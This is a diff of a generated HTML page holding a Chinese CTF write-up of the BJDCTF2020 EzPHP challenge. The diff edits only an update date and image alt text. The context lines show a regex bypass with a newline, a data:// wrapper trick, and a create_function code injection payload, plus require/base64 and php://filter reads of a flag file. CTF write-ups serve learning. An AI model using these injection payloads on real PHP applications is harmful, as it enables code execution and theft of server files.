@@ -540,7 +540,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-08-25
+                    2021-11-18
                 </div>
                 
 
@@ -574,8 +574,8 @@
             <div id="articleContent">
                 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键词:[create_function|get_defined_vars|正则绕过]</p>
 <p>写了快半个月的机器人了，摸了好久的鱼，今天重新开始做web！</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801160534512.png" alt="image-20210801160534512"></p>
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801160544721.png" alt="image-20210801160544721"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801160534512.png"></p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801160544721.png"></p>
 <p>base64解一下，乱码</p>
 <p>试试其他的</p>
 <p>最后base32解出来<code>1nD3x.php</code></p>
@@ -639,8 +639,8 @@
 <pre class="line-numbers language-none"><code class="language-none">debu&#x3D;aqua_is_cute%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h4 id="REQUEST-正则绕过"><a href="#REQUEST-正则绕过" class="headerlink" title="$_REQUEST 正则绕过"></a><code>$_REQUEST</code> 正则绕过</h4><p>先GET后POST，可以POST的一个新值绕过</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801191441715-16278164826491.png" alt="image-20210801191441715"></p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801191457689.png" alt="image-20210801191457689"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801191441715-16278164826491.png"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801191457689.png"></p>
 <p>可见a的值在检测的时候被覆盖了。但实际上没有变。所以只需要在POST里放几个正常参数即可绕过。</p>
 <p>而后面还有shana[]、passwd[]、flag[code]、flag[arg]，这些是数组，不会被正则匹配到，所以不需要加post里</p>
 <h4 id="file-get-contents-file-39-debu-debu-aqua-39"><a href="#file-get-contents-file-39-debu-debu-aqua-39" class="headerlink" title="file_get_contents($file) !== &#39;debu_debu_aqua&#39;"></a><code>file_get_contents($file) !== &#39;debu_debu_aqua&#39;</code></h4><p>就用data伪协议绕过</p>
@@ -722,12 +722,12 @@ flag[code]&#x3D;create_function
 flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;
 %66%6c%61%67[%61%72%67]&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801225458425.png" alt="image-20210801225458425"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801225458425.png"></p>
 <p>然后需要读取<code>rea1fl4g.php</code></p>
 <p>1.过滤了include和引号，还可以用require()</p>
 <pre class="line-numbers language-none"><code class="language-none">&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801231507321.png" alt="image-20210801231507321"></p>
+<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801231507321.png"></p>
 <p>buuctf上改了改，把flag给unset了，所以得换种办法</p>
 <p>2.伪协议</p>
 <pre class="line-numbers language-none"><code class="language-none">&amp;rce&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;rea1fl4g.php
